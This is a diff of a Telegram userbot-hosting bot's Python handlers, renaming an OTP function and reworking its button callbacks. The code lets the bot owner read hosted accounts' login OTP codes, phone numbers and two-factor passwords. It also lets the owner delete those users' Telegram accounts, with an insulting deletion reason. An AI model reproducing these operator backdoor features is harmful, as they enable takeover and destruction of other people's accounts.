@@ -292,7 +292,7 @@ async def next_prev_ubot(client, callback_query):
     )
 
 
-async def get_num_otp(client, callback_query):
+async def tools_userbot(client, callback_query):
     user_id = callback_query.from_user.id
     query = callback_query.data.split()
     if not user_id == OWNER_ID:
@@ -310,7 +310,7 @@ async def get_num_otp(client, callback_query):
                     await callback_query.edit_message_text(
                         otp.text,
                         reply_markup=InlineKeyboardMarkup(
-                            Button.userbot(int(query[2]))
+                            Button.userbot(X.me.id, int(query[2]))
                         ),
                     )
                     await X.delete_messages(X.me.id, otp.id)
@@ -320,7 +320,7 @@ async def get_num_otp(client, callback_query):
         try:
             return await callback_query.edit_message_text(
                 f"<b>📲 ɴᴏᴍᴇʀ ᴛᴇʟᴇᴘᴏɴ ᴅᴇɴɢᴀɴ ᴜsᴇʀ_ɪᴅ <code>{X.me.id}</code> ᴀᴅᴀʟᴀʜ <code>{X.me.phone_number}</code></b>",
-                reply_markup=InlineKeyboardMarkup(Button.userbot(int(query[2]))),
+                reply_markup=InlineKeyboardMarkup(Button.userbot(X.me.id, int(query[2]))),
             )
         except Exception as error:
             return await callback_query.answer(error, True)
@@ -333,8 +333,12 @@ async def get_num_otp(client, callback_query):
         else:
             return await callback_query.edit_message_text(
                 f"<b>🔐 ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴅᴇɴɢᴀɴ ᴜsᴇʀ_ɪᴅ <code>{X.me.id}</code> ᴀᴅᴀʟᴀʜ <code>{code}</code></b>",
-                reply_markup=InlineKeyboardMarkup(Button.userbot(int(query[2]))),
+                reply_markup=InlineKeyboardMarkup(Button.userbot(X.me.id, int(query[2]))),
             )
+    elif query[0] == "ub_deak":
+        return await callback_query.edit_message_reply_markup(
+            reply_markup=InlineKeyboardMarkup(Button.deake(X.me.id, int(query[2])))
+        )
     elif query[0] == "deak_akun":
         ubot._ubot.remove(X)
         await X.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
@@ -345,21 +349,8 @@ async def get_num_otp(client, callback_query):
 <b>├ ɪᴅ:</b> <code>{X.me.id}</code>
 <b>╰ ᴛᴇʟᴀʜ ʙᴇʀʜᴀsɪʟ ᴅɪ ʜᴀᴘᴜs ᴅᴀʀɪ ᴛᴇʟᴇɢʀᴀᴍ</b>
 """,
-            reply_markup=InlineKeyboardMarkup(Button.userbot(0)),
+            reply_markup=InlineKeyboardMarkup(Button.userbot(X.me.id, int(query[2]))),
         )
-
-
-async def delete_account(client, callback_query):
-    user_id = callback_query.from_user.id
-    query = callback_query.data.split()
-    if not user_id == OWNER_ID:
-        return await callback_query.answer(
-            f"❌ ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
-            True,
-        )
-    return await callback_query.edit_message_reply_markup(
-        reply_markup=InlineKeyboardMarkup(Button.deak(int(query[2])))
-    )
 
 
 async def cek_userbot_expired(client, callback_query):
